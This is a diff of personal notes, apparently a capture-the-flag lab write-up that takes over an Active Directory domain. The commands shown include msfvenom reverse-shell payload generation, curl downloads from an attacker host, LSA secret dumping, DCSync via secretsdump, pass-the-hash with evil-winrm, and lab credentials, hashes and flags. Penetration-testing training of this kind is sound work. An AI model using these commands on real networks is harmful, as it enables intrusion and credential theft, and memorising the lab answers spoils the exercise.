@@ -109,6 +109,10 @@ curl http://10.10.17.68:7777/encoded.exe -O C:\Windows\System32\encoded.exe
 ```
 
 ```go
+curl http://10.10.14.190:8888/encoded.exe -O C:\encoded.exe
+```
+
+```go
 C:\Windows\System32\encoded.exe
 ```
 
@@ -303,7 +307,7 @@ Add a route to reach the 172.6.6.0/24 network. Reference the following ![[HTB-Ac
 ![[Pasted image 20260515174239.png]]
 
 ```go
-run autoroute -s 172.16.6.0/16
+run autoroute -s 172.16.6.0/24
 ```
 
 OR
@@ -324,7 +328,7 @@ set SUBNET 172.16.6.0/24
 run
 ```
 
-Confirmed the route has been added and now I have access to it. In a separate window, run msfconsole and scan inside it.
+Confirmed the route has been added and now I have access to it. In the same window, be the autoroute session and run the port scan inside it.
 ```go
 use auxiliary/scanner/portscan/tcp
 ```
@@ -364,66 +368,109 @@ sudo proxychains crackmapexec smb 172.16.6.3 -u svc_sql -p lucky7 -x "type C:\us
 
 #### Question 5:  Find cleartext credentials for another domain user. Submit the username as your answer.
 
-The infrastructure to proxy attacks from my linux host to windows is present. From this point on, I can use techniques from [[Kerberoasting from Linux]], [[Enumerating & Retrieving Password Policies]], [[Credentialed Enumeration from Linux]] and/or [[LLMNR and NBT-NS Poisoning from Linux]]...which ever one is more applicable.
 
->[!Info]
->Ensure to run through the initial set up if your time has expired and your target IP has been reset
-
-#### MSFVenom Payload
+Use crackmapexec to dump secrets from lsa
 ```go
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=9000 -e x86/shikata_ga_nai -i 3 -a x86 -f exe > payload.exe
+sudo proxychains crackmapexec smb 172.16.6.3 -u svc_sql -p lucky7 --lsa
 ```
 
-#### Python HTTP Server
+Answer
 ```go
-python3 -m http.server 7777
-```
-#### Send Payload to Target
-```go
-curl http://10.10.16.3:7777/payload.exe -O C:\Windows\System32\payload.exe
+tpetty
 ```
 
-```go
-C:\Windows\System32\payload
-```
-
-Send over PowerView as well if necessary
-```go
-curl http://10.10.16.3:7777/PowerView.ps1 -O C:\PowerView.ps1
-```
+#### Question 6: 
 
 ```go
-Import-Module .\PowerView.ps1
+sudo proxychains crackmapexec smb 172.16.6.3 -u svc_sql -p lucky7 --lsa
 ```
 
-#### Start a Meterpreter Session
+Answer
 ```go
-msfconsole
+Sup3rS3cur3D0m@inU2eR
+```
+
+#### Question 7: What attack can this user perform?
+
+```go
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=9000 -e x86/shikata_ga_nai -i 3 -a x86 -f exe > encoded.exe
 ```
 
 ```go
-use exploit/multi/handler
+curl http://10.10.16.3:4444/encoded.exe -O C:\encoded.exe
 ```
 
 ```go
-set payload windows/meterpreter/reverse_tcp
+C:\encoded.exe
 ```
 
 ```go
-set lhost 10.10.16.3
+curl http://10.10.16.3:4444/PowerView.ps1 -O C:\PowerView.ps1
 ```
 
 ```go
-set lport 9000
+$tpettysid = Convert-NameToSid tpetty
 ```
 
 ```go
-exploit
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $tpettysid} -Verbose
 ```
 
+![[Pasted image 20260524000208.png]]
 
 Answer:
 ```go
-
+DCSYNC
 ```
 
+#### Question 8: Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01
+
+```go
+curl http://10.10.16.3:4444/Rubeus.exe -O C:\Rubeus.exe
+```
+
+Do the same for PowerView
+```go
+curl http://10.10.16.3:4444/PowerView.ps1 -O C:\PowerView.ps1
+```
+
+Find admin accounts to Kerberoast
+```go
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+
+Can't Kerberoast any users
+![[Pasted image 20260524101331.png]]
+
+>[!Important] THE ATTACK TECH TO USE IS DCSYNC!!!!
+> The user `tpetty` can perform DCSYNC!
+
+
+#### Send mimikatz.exe to the target WEB01
+```go
+curl http://10.10.16.3:4444/mimikatz.exe -O C:\mimikatz.exe
+```
+
+To execute DCSYNC via MImikatz, I must be in the context of the user tpetty
+```go
+runas /netonly /user:INLANEFREIGHT\tpetty "powershell"
+```
+
+>[!error] None of this worked. You will have to proxy all your attacks via proxychains
+
+Use tpetty to perform the dcsync against the admin account to get their hash
+
+#### Get the admin's hash
+```go
+proxychains sudo secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator
+```
+
+To get the flag, use [[Pass the Hash]] technique to get it
+```go
+evil-winrm -i 172.16.6.3 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
+```
+
+Answer:
+```go
+r3plicat1on_m@st3r!
+```
